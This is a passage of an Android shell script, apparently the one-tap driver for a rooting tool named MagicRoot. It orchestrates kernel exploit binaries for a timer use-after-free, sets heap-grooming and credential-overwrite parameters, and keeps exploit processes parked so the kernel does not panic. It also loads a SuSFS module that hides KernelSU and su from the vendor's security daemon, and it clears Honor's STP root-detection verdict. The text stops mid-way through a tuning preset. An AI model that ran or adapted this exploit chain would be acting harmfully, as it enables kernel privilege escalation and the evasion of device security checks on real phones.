#!/system/bin/sh
# MagicRoot 一键链路。
# 工作目录 /data/local/tmp/magic；成功后由 APK 自动清理整个目录。
set -u
D=/data/local/tmp/magic
MARK="$D/marks"
KOPATCH_BIN=${MAGICROOT_KOPATCH:-$D/ko_patch}
ADDRCALC=${MAGICROOT_ADDRCALC:-$D/addrcalc}
KSU_GRANT=${MAGICROOT_KSU_GRANT:-$D/ksu_grant}
WAIT_HELPER=${MAGICROOT_WAIT_HELPER:-$D/wait_helper}
CRED_TARGET=${MAGICROOT_CRED_TARGET:-$D/cred_target}
V36_BIN=${MAGICROOT_T64560_V36:-$D/t64560_v36}
CRED_BIN=${MAGICROOT_T64560_CRED:-$D/t64560_cred}
SUSFS_BIN=${MAGICROOT_SUSFS:-$D/susfs_insmod}
[ -x "$KOPATCH_BIN" ] || KOPATCH_BIN=$D/ko_patch
[ -x "$ADDRCALC" ] || ADDRCALC=$D/addrcalc
[ -x "$KSU_GRANT" ] || KSU_GRANT=$D/ksu_grant
[ -x "$WAIT_HELPER" ] || WAIT_HELPER=$D/wait_helper
[ -x "$CRED_TARGET" ] || CRED_TARGET=$D/cred_target
[ -x "$V36_BIN" ] || V36_BIN=$D/t64560_v36
[ -x "$CRED_BIN" ] || CRED_BIN=$D/t64560_cred
[ -x "$SUSFS_BIN" ] || SUSFS_BIN=$D/susfs_insmod
STAGE_LOG="$D/stage.log"

# Root backend flavor (BakaSU / FinaSU / KernelSU / SukiSU / KernelSU-Next /
# SukiSU Nova).  The app writes $D/ksu_flavor and also passes
# MAGICROOT_KSU_FLAVOR; the package / userspace / LKM template mapping lives
# in kernel_profiles.sh.
KSU_FLAVOR=${MAGICROOT_KSU_FLAVOR:-$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')}
case "$KSU_FLAVOR" in
    resukisu|fina|kernelsu|sukisu|next|nova|maplesu) ;;
    official|bakasu) KSU_FLAVOR=resukisu ;;
    *) KSU_FLAVOR=kernelsu ;;
esac
export MAGICROOT_KSU_FLAVOR="$KSU_FLAVOR"
# SUSFS is an optional add-on under the Flavor selector, not a flavor.
SUSFS_SOURCE=env
if [ -z "${MAGICROOT_SUSFS:-}" ]; then
    SUSFS_SOURCE=marker
    SUSFS_ENABLE=$(cat "$D/susfs" 2>/dev/null || echo 0)
else
    SUSFS_ENABLE=$MAGICROOT_SUSFS
fi
# Older app versions wrote an empty marker via `touch`.  Treat any existing
# marker except an explicit 0 as enabled; the app now writes "1".
if [ -z "$SUSFS_ENABLE" ]; then
    [ -f "$D/susfs" ] && SUSFS_ENABLE=1 || SUSFS_ENABLE=0
fi
case "$SUSFS_ENABLE" in 1) ;; *) SUSFS_ENABLE=0 ;; esac
# SuSFS guard is unsupported only by official KernelSU here.  Every other
# backend is allowed to attempt its KMI-matched guard.
case "$KSU_FLAVOR" in
    kernelsu)
        if [ "$SUSFS_ENABLE" = "1" ]; then
            echo "SuSFS_FLAVOR_UNSUPPORTED flavor=$KSU_FLAVOR; forcing switch off"
            SUSFS_ENABLE=0
        fi ;;
    *) ;;
esac
echo "SuSFS_SWITCH=$SUSFS_ENABLE source=$SUSFS_SOURCE"
export MAGICROOT_SUSFS="$SUSFS_ENABLE"
export SUSFS_ENABLE
KSU_MANAGER_PKG=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR" 2>/dev/null || echo me.weishu.kernelsu)}
KSU_MANAGER_LABEL=$(ksu_flavor_label "$KSU_FLAVOR" 2>/dev/null || echo BakaSU)
KSU_KSud=$(ksu_flavor_ksud "$KSU_FLAVOR" 2>/dev/null || echo ksud)
EXPECT_KVER=$(ksu_flavor_kver "$KSU_FLAVOR" 2>/dev/null || echo 32680)
EXPECT_UAPI=$(ksu_flavor_uapi "$KSU_FLAVOR" 2>/dev/null || echo 5)
export MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG"
export MAGICROOT_EXPECT_KVER="$EXPECT_KVER"
export MAGICROOT_EXPECT_UAPI="$EXPECT_UAPI"

mark() {
    mkdir -p "$D" 2>/dev/null || true
    _m="STAGE_MARK=$1 time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null) boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
    echo "$_m"
    echo "$_m" >> "$STAGE_LOG" 2>/dev/null || true
    sync 2>/dev/null || true
}

# Clean stale 98260 rootd/socket state on every run.  Stale sockets are
# removed unconditionally; a live plant is ended only when normal su works.
cleanup_stale_98260_rootd() {
    _rs1=/data/local/tmp/pc98260-root.sock
    _rs2=/data/local/tmp/pc98260-root2.sock
    # User opted to keep the full-cap rootd + socket for stpclear.  Rootd is
    # the only full-capability path to libstp/hisecd, so do not unlink it.
    if [ "${MAGICROOT_KEEP_ROOTD:-0}" = "1" ] || [ -f "$D/.keep-rootd-user" ]; then
        echo "RUNSH_ROOTD_KEPT=1 reason=user_keep"
        return 0
    fi
    # KSU load is the success boundary.  su may legitimately be hidden by
    # SELinux/namespace; do not re-probe rootd/plant/uid after this point.
    if [ -f "$D/.ksu_loaded" ] || [ -f "$D/.ksu_su_ready" ]; then
        rm -f "$D/.ksu_loaded" "$D/.ksu_su_ready" "$_rs1" "$_rs2" 2>/dev/null || true
        echo "RUNSH_ROOTD_HANDLED=1 reason=ksu_loaded"
        return 0
    fi
    _rproc=0
    pidof exploit-android-key-ptr >/dev/null 2>&1 && _rproc=1
    ps -A 2>/dev/null | grep -q '[e]xploit-android' && _rproc=1
    if [ "$_rproc" = "0" ]; then
        # No live plant: any socket is stale.  Shell may be denied unlink due
        # SELinux; retry via su and verify instead of claiming success.
        if [ -S "$_rs1" ] || [ -S "$_rs2" ]; then
            rm -f "$_rs1" "$_rs2" 2>/dev/null || true
            if [ -S "$_rs1" ] || [ -S "$_rs2" ]; then
                _rsu=""
                if command -v su >/dev/null 2>&1; then _rsu=$(command -v su)
                elif [ -x /system/bin/su ]; then _rsu=/system/bin/su
                elif [ -x /data/adb/ksu/bin/su ]; then _rsu=/data/adb/ksu/bin/su
                fi
                [ -n "$_rsu" ] && timeout -k 2 10 "$_rsu" -c "rm -f $_rs1 $_rs2" 2>/dev/null || true
            fi
            if [ ! -S "$_rs1" ] && [ ! -S "$_rs2" ]; then
                echo "RUNSH_STALE_SOCKETS_REMOVED=1"
            else
                echo "RUNSH_STALE_SOCKETS_KEPT=1 reason=remove_denied"
            fi
        fi
        return 0
    fi
    if [ -f "$D/.keep-rootd" ]; then
        echo "RUNSH_ROOTD_KEPT=1 reason=su_entry_failed"
        return 0
    fi
    _rsu=""
    if command -v su >/dev/null 2>&1; then _rsu=$(command -v su)
    elif [ -x /system/bin/su ]; then _rsu=/system/bin/su
    elif [ -x /data/adb/ksu/bin/su ]; then _rsu=/data/adb/ksu/bin/su
    fi
    _persistent_su=0
    [ -x /system/bin/su ] && _persistent_su=1
    [ -x /data/adb/ksu/bin/su ] && _persistent_su=1
    if [ "$_persistent_su" = "0" ] && [ -n "$_rsu" ]; then
        case "$_rsu" in
            "$D"/*|"$D") ;;
            *) _persistent_su=1 ;;
        esac
    fi
    _ruid=""
    [ -n "$_rsu" ] && _ruid=$(timeout -k 2 ${MAGICROOT_SU_PROBE_TIMEOUT:-10} "$_rsu" -c 'id -u' 2>/dev/null | tr -d ' \r\n')
    if [ "$_ruid" = "0" ]; then
        if [ "$_persistent_su" = "1" ]; then
            # Killing the parent reparents a timer-UAF zombie to init, which panics
            # in posix_cpu_timers_exit/rb_next.  Unlink the socket only.
            timeout -k 2 ${MAGICROOT_SU_PROBE_TIMEOUT:-10} "$_rsu" -c "rm -f $_rs1 $_rs2" 2>/dev/null || true
            echo "RUNSH_ROOTD_SOFT_CLEANED=1 reason=zombie_reap_panic"
        else
            echo "RUNSH_ROOTD_KEPT=1 reason=no_persistent_su uid=0"
        fi
    else
        if [ "$_persistent_su" = "1" ]; then
            rm -f "$_rs1" "$_rs2" 2>/dev/null || true
            if [ ! -S "$_rs1" ] && [ ! -S "$_rs2" ]; then
                echo "RUNSH_ROOTD_PARKED=1 reason=no_working_su socket_removed=1 uid=${_ruid:-unknown}"
            else
                echo "RUNSH_ROOTD_KEPT=1 reason=no_working_su socket_remove_denied uid=${_ruid:-unknown}"
            fi
        else
            echo "RUNSH_ROOTD_KEPT=1 reason=no_persistent_su uid=${_ruid:-unknown}"
        fi
    fi
}

# Standard 98260 rootd cleanup.
#
# The legacy path deliberately drops only the rootd socket and leaves the
# exploit parent parked.  Once KernelSU su is verified, the socket listener
# child can be killed safely: its parent never waitpid()s it, so the UAF timer
# tree is never released and the kernel does not panic.  The exploit parent
# MUST stay alive until reboot.
cleanup_98260_rootd_listener() {
    _sock=/data/local/tmp/pc98260-root.sock
    # This run loaded KSU: never probe su here.  The manager may be
    # restarting and a probe both blocks (up to 15 s) and used to print a
    # contradictory "ROOTD_CLEANUP=skip reason=no_ksu_su" after run98260 had
    # already reported "98260_CLEANUP=ok".  Unlink what we can without su and
    # record the honest state; the listener child dies with the reboot.
    if [ -f "$D/.ksu_loaded" ]; then
        if [ -S "$_sock" ] || [ -e "$_sock" ]; then
            rm -f "$_sock" /data/local/tmp/pc98260-root2.sock 2>/dev/null || true
        fi
        if [ -S "$_sock" ] || [ -e "$_sock" ]; then
            echo "98260_ROOTD_CLEANUP=deferred reason=socket_remains no_su_probe=1"
        else
            echo "98260_ROOTD_CLEANUP=handled reason=ksu_loaded socket_absent=1 no_su_probe=1"
        fi
        return 0
    fi
    _t0=$(cut -d' ' -f1 /proc/uptime 2>/dev/null || echo 0)
    # su output goes through a file, never through a pipe back to us: when
    # `timeout` kills su it cannot kill the root-side grandchild, and a
    # surviving grandchild holding the pipe made the whole $(...) wait for it
    # (observed as ~60 s of "98% 收尾中" even though timeout said 15 s).
    _probe=$D/.su-probe-$$.out

    # "su" (PATH-resolved) must be tried, not just the two absolute paths:
    # every other KSU-su probe in this codebase (run98260.sh's H1C
    # already-loaded reuse check, su_entry.sh's candidate list) leads with
    # a bare "su" lookup because some Flavors (observed with SukiSU on a
    # 6.12.58 build) expose su via a PATH-visible wrapper before or instead
    # of /data/adb/ksu/bin/su existing as a real file. Checking only the
    # two absolute paths here previously left rootd un-cleaned even though
    # the KSU module had already loaded successfully (98260_KSU=loaded).
    _ksu_su=""
    for _s in su /system/bin/su /data/adb/ksu/bin/su; do
        case "$_s" in
            /*) [ -x "$_s" ] || continue ;;
            *) command -v "$_s" >/dev/null 2>&1 || continue ;;
        esac
        rm -f "$_probe"
        timeout -k 2 5 "$_s" -c 'id -u' > "$_probe" 2>/dev/null
        _uid=$(tr -d ' \r\n' < "$_probe" 2>/dev/null)
        if [ "$_uid" = "0" ]; then _ksu_su="$_s"; break; fi
    done
    rm -f "$_probe"
    if [ -z "$_ksu_su" ]; then
        echo "98260_ROOTD_CLEANUP=skip reason=no_ksu_su"
        return 0
    fi

    # Rootd listener discovery must run as root: the uid=2000 shell cannot read
    # /proc/<listener>/fd on this SELinux policy.  The helper kills ONLY the
    # listener child; the PPID=1 exploit parent is preserved.
    #
    # Discovery is child-list based, not "readlink every fd of every process".
    # The old full scan forked one readlink per fd on a device with >1k
    # processes; on a long-running boot that alone took about a minute and the
    # finalize looked hung.  /proc/<parent>/task/<tid>/children lists the
    # listener directly, so the fd check only runs on that handful of pids.
    # NOTE: comm is truncated to 15 chars by the kernel, so the match must be
    # "exploit-android" (the old fallback compared the full 20-char name and
    # could never match).
    _helper=$D/.rootd-cleanup-$$.sh
    _helper_out=$D/.rootd-cleanup-$$.out
    cat > "$_helper" <<'ROOTD_CLEAN_EOF'
#!/system/bin/sh
sock=/data/local/tmp/pc98260-root.sock
inode=$(awk -v p="$sock" '$8 == p { print $7; exit }' /proc/net/unix 2>/dev/null)

read_ppid() {
    _pp=""
    while read -r _k _v _rest; do
        if [ "$_k" = "PPid:" ]; then _pp=$_v; break; fi
    done < "/proc/$1/status" 2>/dev/null
    printf '%s' "$_pp"
}

# This kernel does NOT enable CONFIG_PROC_CHILDREN: /proc/*/task/*/children
# does not exist, so any children-file based discovery silently finds nothing
# and the helper always fell back to the full /proc/*/fd/* readlink scan (the
# >8 s stall seen on 6.12.58).  Instead, find the rootd listener directly: it is
# the exploit-android process holding the rootd socket.  Only exploit-android
# processes get their fds inspected — a cheap, bounded set, not the whole
# process table.  The PPID=1 parked parent never holds the socket, so it is
# never a kill target.
echo "ROOTD_CLEAN_PHASE=scan_exploit inode=${inode:-none}"
_killed=0
for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    [ "$pid" = "$$" ] && continue
    _comm=""
    if ! { read -r _comm < "$p/comm"; } 2>/dev/null; then
        continue
    fi
    [ "$_comm" = "exploit-android" ] || continue
    # Only exploit-android processes reach the fd scan.  When the socket inode
    # is known, the holder is the listener; kill it.  Without an inode (socket
    # already unlinked) there is nothing safe to do — leave processes parked.
    if [ -n "$inode" ]; then
        for fd in "$p"/fd/*; do
            link=$(readlink "$fd" 2>/dev/null) || continue
            case "$link" in
                *"socket:[$inode]"*)
                    _pp=$(read_ppid "$pid")
                    echo "ROOTD_PID=$pid PPID=$_pp COMM=$_comm"
                    kill -9 "$pid" 2>/dev/null
                    echo "ROOTD_KILL_RC=$?"
                    _killed=1
                    ;;
            esac
            [ "$_killed" = "1" ] && break
        done
    fi
    [ "$_killed" = "1" ] && break
done
if [ "$_killed" != "1" ]; then
    if [ -n "$inode" ]; then
        echo "ROOTD_CLEAN_NO_PID inode=$inode"
    else
        echo "ROOTD_CLEAN_NO_PARENT"
    fi
fi
ROOTD_CLEAN_EOF
    chmod 755 "$_helper" 2>/dev/null || true
    rm -f "$_helper_out"
    # Do not synchronously wait for the su channel.  Some SukiSU sessions keep
    # the caller alive after the root helper has already killed the listener;
    # the 2026-11-07 run spent 128730 ms here and ended with rc=137.  Start the
    # helper in a new session with every standard fd detached, then poll only
    # its result file.  The helper is bounded and never targets the PPID=1
    # exploit parent; abandoning a stuck launch is therefore safe.
    timeout -k 2 ${MAGICROOT_ROOTD_LAUNCH_TIMEOUT:-5} "$_ksu_su" -c \
        "setsid sh '$_helper' > '$_helper_out' 2>&1 < /dev/null &"
    _helper_rc=$?
    echo "ROOTD_CLEAN_LAUNCH_RC=$_helper_rc"
    _wait_limit=${MAGICROOT_ROOTD_CLEANUP_WAIT_MS:-8000}
    case "$_wait_limit" in ''|*[!0-9]*) _wait_limit=8000 ;; esac
    _wait_ms=0
    _rout=""
    while [ "$_wait_ms" -lt "$_wait_limit" ]; do
        _rout=$(cat "$_helper_out" 2>/dev/null)
        case "$_rout" in
            *ROOTD_KILL_RC=*|*ROOTD_CLEAN_NO_PARENT*|*ROOTD_CLEAN_NO_CHILD*|*ROOTD_CLEAN_NO_PID*)
                break
                ;;
        esac
        sleep 0.1
        _wait_ms=$((_wait_ms + 100))
    done
    _rout=$(cat "$_helper_out" 2>/dev/null)
    echo "ROOTD_CLEAN_WAIT_MS=$_wait_ms"
    rm -f "$_helper" "$_helper_out"
    echo "98260_ROOTD_CLEANUP=root_helper ${_rout:-no_output}"
    _t1=$(cut -d' ' -f1 /proc/uptime 2>/dev/null || echo 0)
    echo "98260_ROOTD_CLEANUP_MS=$(awk -v a="$_t0" -v b="$_t1" 'BEGIN{printf "%d", (b-a)*1000}' 2>/dev/null || echo 0) launch_rc=$_helper_rc"
    case "$_rout" in
        *ROOTD_KILL_RC=0*)
            echo "98260_ROOTD_CLEANUP=ok reason=listener_child_zombie_via_root"
            ;;
        *ROOTD_PID=*)
            echo "98260_ROOTD_CLEANUP=fail reason=kill_rc_not_zero"
            ;;
        *)
            if [ "$_wait_ms" -ge "$_wait_limit" ]; then
                echo "98260_ROOTD_CLEANUP=skip reason=helper_result_timeout launch_rc=$_helper_rc"
            else
                echo "98260_ROOTD_CLEANUP=skip reason=root_pid_not_found sock_present=$([ -S "$_sock" ] && echo 1 || echo 0)"
            fi
            ;;
    esac
    return 0
}

# Clear the Honor STP/hisecd root verdict after root is available.  m6's
# hisecd kill alone does not clear the persisted/kernel STP status; libstp's
# StpClearStatus() is the missing step needed before creating Parallel Space.
stp_clear_fix() {
    # Temporary diagnostic switch: /data/local/tmp/magic/skip_stp or
    # MAGICROOT_SKIP_STP=1.  Never set this in normal use; it is used only to
    # measure whether the remaining SuSFS hiding is sufficient by itself.
    if [ "${MAGICROOT_SKIP_STP:-0}" = "1" ] || [ -f "$D/skip_stp" ]; then
        echo "STP_CLEAR=skip requested"
        return 0
    fi
    _stp="$D/stpclear"
    [ -x "$_stp" ] || { echo "STP_CLEAR=missing path=$_stp"; return 0; }
    if [ -x "$D/pc98260-su" ] && [ -S /data/local/tmp/pc98260-root.sock ]; then
        _out=$(timeout ${MAGICROOT_STP_TIMEOUT:-60} "$D/pc98260-su" -c "!$_stp" 2>&1); _rc=$?
    elif command -v su >/dev/null 2>&1; then
        _out=$(timeout ${MAGICROOT_STP_TIMEOUT:-60} su -c "$_stp" 2>&1); _rc=$?
    else
        echo "STP_CLEAR=skip no_root_backend"
        return 0
    fi
    echo "STP_CLEAR_RC=$_rc"
    printf '%s\n' "$_out" | tail -5
    return 0
}

# Load the SUSFS guard LKM (userdata only, no system partition change).
# The app may stage a newer online-downloaded module as
# $D/susfs_guard_lkm.updated.ko.  Prefer it when its vermagic KMI matches the
# running kernel; if insmod fails, retry the bundled module.  Online update is
# never allowed to break the fallback.
susfs_kmi_of() {
    _vm=$(grep -a -o 'vermagic=[^ ]*' "$1" 2>/dev/null | head -1)
    printf '%s' "$_vm" | sed -n 's/^vermagic=\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p'
}

susfs_loaded() {
    # run98260 preloads the guard through the fake-cred rootd before KSU
    # late-load.  After KSU hides /sys/module from the shell domain, the
    # boot-id marker is the only reliable userspace evidence.
    if [ -f "$D/.susfs_preloaded" ] &&
       [ "$(cat "$D/.susfs_preloaded" 2>/dev/null)" = "$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)" ]; then
        return 0
    fi
    if command -v su >/dev/null 2>&1 &&
       su -c "test -d /sys/module/susfs_guard_lkm || test -e /proc/susfs_path || test -e /proc/susfs_kstat || grep -q '^susfs_guard_lkm ' /proc/modules" 2>/dev/null; then
        return 0
    fi
    [ -d /sys/module/susfs_guard_lkm ] && return 0
    [ -e /proc/susfs_path ] && return 0
    [ -e /proc/susfs_kstat ] && return 0
    # expose_proc=0 or a slow LSM init can leave both nodes absent while the
    # module itself is live; /proc/modules is the authoritative load check.
    grep -q '^susfs_guard_lkm ' /proc/modules 2>/dev/null
}

susfs_wait_loaded() {
    _sw_i=0
    _sw_max=${MAGICROOT_SUSFS_WAIT_LOOPS:-240}
    while [ "$_sw_i" -lt "$_sw_max" ]; do
        susfs_loaded && return 0
        sleep 0.25 2>/dev/null || sleep 1
        _sw_i=$((_sw_i + 1))
    done
    susfs_loaded
}

susfs_load() {
    [ "${SUSFS_ENABLE:-0}" = "1" ] || { echo "SuSFS_LKM_LOAD=disabled reason=switch_off"; return 0; }
    case "${KSU_FLAVOR:-kernelsu}" in
        kernelsu) echo "SuSFS_LKM_LOAD=skipped reason=official_ksu_unsupported"; return 0 ;;
        *) ;;
    esac
    # 98260 preloads this before KSU; rootd is no longer usable here.
    if [ "${MAGICROOT_SUSFS_PROTECT:-0}" = "1" ] && ! susfs_loaded; then
        # The fake-cred chain preloaded the guard through rootd before KSU.
        # The real-cred chain has no rootd socket; KSU's full-cap su can still
        # load the guard here, just after KSU instead of before it.
        _protect_su=""
        if command -v su >/dev/null 2>&1; then
            _protect_su=$(su -c 'id -u' 2>/dev/null | tr -d ' \r\n')
        fi
        if [ "$_protect_su" = "0" ]; then
            echo "SuSFS_LKM_PROTECT=post_load reason=real_cred_su"
        else
            echo "SuSFS_LKM_LOAD=skipped reason=protect_mode_requires_rootd_preload"
            echo "SuSFS_LKM_STATE=not_loaded"
            return 0
        fi
    fi
    if susfs_loaded; then
        echo "SuSFS_LKM_LOAD=already_loaded verify=$(susfs_loaded && echo module_or_proc)"
        return 0
    fi
    _loader="$SUSFS_BIN"
    _updated="$D/susfs_guard_lkm.updated.ko"
    [ -f "$_loader" ] || { echo "SuSFS_LKM_LOAD=skip missing_loader"; return 0; }
    _ksud="$D/ksud_$KSU_FLAVOR"
    [ -x "$_ksud" ] || _ksud=/data/adb/ksud
    _target=$(uname -r 2>/dev/null | sed -n 's/^\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p')
    [ -n "$_target" ] || _target="unknown"
    _bundled="$D/susfs_guard_lkm-${_target}.ko"
    echo "SuSFS_LKM_TARGET_KMI=$_target"
    echo "SuSFS_LKM_BUNDLED=$_bundled"
    _cands=""
    if [ -f "$_updated" ]; then
        _ukmi=$(susfs_kmi_of "$_updated")
        if [ -n "$_ukmi" ] && { [ "$_ukmi" = "$_target" ] || [ "$_target" = "unknown" ]; }; then
            _cands="$_updated"
            echo "SuSFS_LKM_CANDIDATE=$_updated source=updated kmi=$_ukmi"
        else
            echo "SuSFS_LKM_UPDATED=skip reason=kmi_mismatch target=$_target updated=${_ukmi:-none}"
        fi
    fi
    if [ -f "$_bundled" ]; then
        _cands="$_cands $_bundled"
    fi
    [ -n "$_cands" ] || {
        echo "SuSFS_LKM_LOAD=skipped reason=no_guard_module"
        echo "SuSFS_LKM_STATE=not_loaded"
        echo "SuSFS_LKM_HINT=switch_on_but_no_exact_kmi_guard; bundle/update was not provided"
        return 0
    }

    _loaded=0
    _used=""
    for _ko_try in $_cands; do
        [ -f "$_ko_try" ] || continue
        _ko_kmi=$(susfs_kmi_of "$_ko_try")
        if [ -z "$_ko_kmi" ] || [ "$_ko_kmi" != "$_target" ]; then
            echo "SuSFS_LKM_SKIP=$_ko_try reason=kmi_mismatch target=$_target module=${_ko_kmi:-none}"
            continue
        fi
        # Upstream release modules are accepted on KMI match.  The hardening
        # marker is diagnostic only; a missing marker must not reject a valid
        # upstream guard.
        grep -a -q 'susfs_or_entry_expected_hook' "$_ko_try" ||
            echo "SuSFS_LKM_HARDENING=absent module=$_ko_try"
        echo "SuSFS_LKM_TRY=$_ko_try"
        _cmd="chmod 755 '$_loader'; if [ -d /sys/module/susfs_guard_lkm ]; then echo susfs_already_loaded; rc=0; elif [ -x '$_ksud' ]; then '$_ksud' insmod '$_ko_try' expose_proc=1; rc=\$?; [ \"\$rc\" = 0 ] || { echo insmod_fallback_loader; '$_loader' '$_ko_try' expose_proc=1; rc=\$?; }; else '$_loader' '$_ko_try' expose_proc=1; rc=\$?; fi; echo insmod_rc=\$rc; exit \$rc"
        if command -v su >/dev/null 2>&1; then
            _out=$(timeout -k 10 ${MAGICROOT_SUSFS_TIMEOUT:-180} su -c "$_cmd" 2>&1); _rc=$?
        elif [ -x "$D/pc98260-su" ]; then
            _out=$(timeout -k 10 ${MAGICROOT_SUSFS_TIMEOUT:-180} "$D/pc98260-su" -c "$_cmd" 2>&1); _rc=$?
        else
            echo "SuSFS_LKM_LOAD=skip no_root_backend"
            return 0
        fi
        echo "SuSFS_LKM_LOAD_RC=$_rc"
        printf '%s\n' "$_out" | tail -8
        if susfs_wait_loaded; then
            _loaded=1
            _used="$_ko_try"
            echo "SuSFS_LKM_VERIFIED=module_or_proc rc=$_rc"
            break
        fi
        if [ "$_rc" = "0" ]; then
            echo "SuSFS_LKM_RC0_UNVERIFIED=$_ko_try reason=no_module_or_proc_after_wait"
        fi
        echo "SuSFS_LKM_ATTEMPT_FAILED=$_ko_try"
    done

    if [ "$_loaded" != "1" ]; then
        echo "SuSFS_LKM_LOADED=0 reason=not_loaded rc=${_rc:-none}"
        echo "SuSFS_LKM_STATE=not_loaded"
        echo "SuSFS_LKM_FALLBACK=exhausted"
        return 0
    fi
    echo "SuSFS_LKM_USED=$_used"
    if [ -n "${_updated:-}" ] && [ "$_used" = "$_updated" ]; then
        echo "SuSFS_LKM_SOURCE=updated"
        echo "SuSFS_LKM_FALLBACK=0"
    else
        echo "SuSFS_LKM_SOURCE=external"
        echo "SuSFS_LKM_FALLBACK=1"
    fi
    echo "SuSFS_LKM_LOADED=1"
    echo "SuSFS_LKM_STATE=loaded"
    if command -v su >/dev/null 2>&1; then
        timeout -k 3 ${MAGICROOT_SUSFS_HIDE_TIMEOUT:-15} su -c 'echo "add kernelsu" > /proc/susfs_hide_modules' >/dev/null 2>&1 || true
        # Hide /system/bin/su from non-app (hisecd/check-su) opens only.
        # app UIDs (>=10000) keep the real path for su_forward.
        timeout -k 3 ${MAGICROOT_SUSFS_HIDE_TIMEOUT:-15} su -c 'echo "add_open_redirect /system/bin/su /dev/null 0" > /proc/susfs_open_redirect' >/dev/null 2>&1 || true
    elif [ -x "$D/pc98260-su" ]; then
        timeout -k 3 ${MAGICROOT_SUSFS_HIDE_TIMEOUT:-15} "$D/pc98260-su" -c 'echo "add kernelsu" > /proc/susfs_hide_modules' >/dev/null 2>&1 || true
        timeout -k 3 ${MAGICROOT_SUSFS_HIDE_TIMEOUT:-15} "$D/pc98260-su" -c 'echo "add_open_redirect /system/bin/su /dev/null 0" > /proc/susfs_open_redirect' >/dev/null 2>&1 || true
    fi
    return 0
}

# Only the explicit Tools action may restart zygote; never schedule stop/start.
soft_reboot_repair() {
    echo "SOFT_REBOOT_REPAIR=disabled reason=use_explicit_zygote_hotfix"
}

# Shared 98260 success tail.
#
# KSU is already the success boundary; this phase only loads the optional
# SuSFS guard and removes the now-unused rootd listener/socket.  All cleanup
# calls are best-effort and bounded.  The explicit markers are essential:
# without them the app used to treat "SuSFS_LKM_LOAD=disabled" as a slow
# module load and sat at 98% with no visible finalization phase.
finalize_98260() {
    _fz_load_susfs=${1:-1}
    echo "98260_FINALIZE_BEGIN susfs=${SUSFS_ENABLE:-0} load=${_fz_load_susfs} rootd_keep=${MAGICROOT_KEEP_ROOTD:-0}"
    if [ "$_fz_load_susfs" = "1" ]; then
        susfs_load
        soft_reboot_repair
    fi
    cleanup_98260_rootd_listener
    cleanup_stale_98260_rootd
    echo "98260_FINALIZE_END"
}

KASLR_ONLY=${MAGICROOT_KASLR_ONLY:-0}
[ -f "$D/kaslr-only" ] && KASLR_ONLY=1
case "$KASLR_ONLY" in 1) ;; *) KASLR_ONLY=0 ;; esac
AB_EXPORT=0
[ -f "$D/ab-export" ] && AB_EXPORT=1

# Tuning presets.  Default is now reference (HyperBreak Enhanced's validated
# 6.18 values); the previous fast/fail-fast values remain available as
# $D/tuning-current.  The existing UI victim buttons remain user overrides.
#   $D/tuning-current   : MagicRoot fast/fail-fast values
#                         (16 perm victims / 160 attempts / 24 cred victims /
#                          260+320 cred attempts)
#   $D/tuning-reference : default tuned values
#                         (24 victims / 200-300 attempts / 12000 nfrag /
#                          10000 cred drain / 3500 min)
#   $D/tuning-alt       : legacy alternate values
#                         (16 victims / 180 perm attempts / 90+90 writer / 6000 nfrag)
#   $D/tuning-v42       : upstream CVE-2026-64560-public v42 evidence values
#                         (24 victims / 200+300 cred attempts / 12000 nfrag /
#                          10000 cred drain / 3500 min)
#   $D/tuning-legacy-v42: legacy v42 invocation values
#                         (16 victims / 160 permissive / 260+320 cred /
#                          6000 nfrag / 12000 drain / 4500 min)
# Environment overrides MAGICROOT_* always win over the preset.
TUNING=reference
[ -f "$D/tuning-current" ] && TUNING=current
[ -f "$D/tuning-reference" ] && TUNING=reference
[ -f "$D/tuning-v42" ] && TUNING=v42
[ -f "$D/tuning-legacy-v42" ] && TUNING=legacy-v42
[ -f "$D/tuning-alt" ] && TUNING=alt
[ -n "${MAGICROOT_TUNING:-}" ] && TUNING=$MAGICROOT_TUNING
case "$TUNING" in
    reference|v42)
        DEF_VICTIMS_PERMISSIVE=24; DEF_VICTIMS_FSUID=24; DEF_VICTIMS_CRED=24
        DEF_ATTEMPTS_PERMISSIVE=200; DEF_ATTEMPTS_FSUID=200
        DEF_ATTEMPTS_CRED1=200; DEF_ATTEMPTS_CRED2=300
        DEF_FRAG_PERMISSIVE=12000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=12000; DEF_DRAIN_CRED1=10000; DEF_MIN_CRED1=3500
        DEF_DRAIN_CRED2=10000; DEF_MIN_CRED2=3500
        ;;
    legacy-v42)
        # legacy v42 invocation:
        #   t64560_v36 0 <addr> 160 400 16 6000 12000 4500
        #   t64560_v42 <cred> 260 320 400 16 6000 12000 4500
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=16
        DEF_ATTEMPTS_PERMISSIVE=160; DEF_ATTEMPTS_FSUID=160
        DEF_ATTEMPTS_CRED1=260; DEF_ATTEMPTS_CRED2=320
        DEF_FRAG_PERMISSIVE=6000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=6000; DEF_DRAIN_CRED1=12000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=12000; DEF_MIN_CRED2=4500
        ;;
    alt)
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=16
        DEF_ATTEMPTS_PERMISSIVE=180; DEF_ATTEMPTS_FSUID=180
        DEF_ATTEMPTS_CRED1=90; DEF_ATTEMPTS_CRED2=90
        DEF_FRAG_PERMISSIVE=6000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=6000; DEF_DRAIN_CRED1=12000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=12000; DEF_MIN_CRED2=4500
        ;;
    *)
        TUNING=current
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=24
